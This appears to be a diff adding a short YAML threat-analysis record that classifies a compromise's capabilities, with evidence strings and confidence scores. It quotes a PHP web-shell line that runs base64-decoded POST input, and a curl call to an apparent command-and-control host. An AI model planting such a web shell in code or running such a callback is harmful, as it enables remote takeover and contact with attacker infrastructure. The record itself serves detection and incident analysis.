@@ -1,0 +1,14 @@
+observed:
+  - cap: rce_via_webshell
+    evidence:
+      - "eval(base64_decode($_POST['cmd']))"
+    confidence: 1.0
+  - cap: c2_callback_outbound
+    evidence:
+      - "curl -s http://vagqea4wrlkdg.top/gate"
+    confidence: 1.0
+inferred:
+  - cap: credential_harvest
+    basis: "PolyShell APSB25-94 family commonly includes cred harvest"
+    confidence: 0.65
+likely_next: []
